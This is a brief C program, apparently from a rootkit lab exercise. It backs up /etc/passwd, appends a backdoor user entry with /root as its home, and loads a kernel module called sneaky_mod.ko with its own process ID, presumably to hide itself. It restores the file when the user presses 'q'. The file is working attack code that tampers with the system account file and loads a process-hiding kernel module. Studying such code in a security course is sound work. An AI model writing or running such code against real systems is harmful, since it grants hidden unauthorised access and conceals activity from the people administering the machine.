#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int main(){
  //step1
  int pid = (int)getpid();
  printf("sneaky_process pid = %d\n", pid);

  //step2
  system("cp /etc/passwd /tmp/passwd");
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");

  //step3
  char load_mod[64];
  sprintf(load_mod, "insmod sneaky_mod.ko mypid=%d", pid);
  system(load_mod);
  
  //step4
  while (getchar() != 'q'){
  }
  
  //step5
  system("rmmod sneaky_mod.ko");

  //step6
  system("cp /tmp/passwd /etc/passwd");
  
  return EXIT_SUCCESS;
}
